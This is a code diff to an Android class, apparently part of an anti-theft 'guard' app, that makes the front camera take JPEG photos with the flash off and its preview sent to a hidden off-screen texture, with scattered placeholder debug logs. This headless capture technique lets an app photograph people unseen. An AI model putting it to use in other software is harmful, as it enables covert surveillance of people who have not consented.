@@ -1,13 +1,17 @@
 package wiretap.androidguard;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.pm.PackageManager;
+import android.graphics.ImageFormat;
+import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.os.Environment;
 import android.util.Log;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -27,6 +31,7 @@ public class Photographer {
         @Override
         public void onPictureTaken(byte[] data, Camera camera) {
 
+            Log.d("Debug", "dupa8");
             File pictureFileDir = getDir();
 
             if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
@@ -66,7 +71,7 @@ public class Photographer {
         }
     }
 
-    private static class PhotoTaker {
+    private static class PhotoTaker{
         private final static String DEBUG_TAG = "PhotoTaker";
         private Camera camera;
         private int cameraId = 0;
@@ -81,15 +86,32 @@ public class Photographer {
                     Log.e("Photographer", "No front facing camera found.");
                 } else {
                     camera = Camera.open(cameraId);
+                    if(camera == null)
+                        Log.d("Debug", "dupa7");
+                    try {
+                        Log.d("Debug", "dupa1");
+                        camera.setPreviewTexture(new SurfaceTexture(10));
+                        Log.d("Debug", "dupa2");
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                        Log.d("Debug", "dupa3");
+                    }
                 }
             }
             handler = h;
         }
 
         public void shoot() {
+            Log.d("Debug", "dupa4");
             if(camera != null) {
+                Camera.Parameters params = camera.getParameters();
+                params.setPreviewSize(640, 480);
+                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
+                params.setPictureFormat(ImageFormat.JPEG);
+                camera.setParameters(params);
                 camera.startPreview();
                 camera.takePicture(null, null, handler);
+                Log.d("Debug", "dupa5");
             } else {
                 Log.e("Photographer", "No camera opened!");
             }
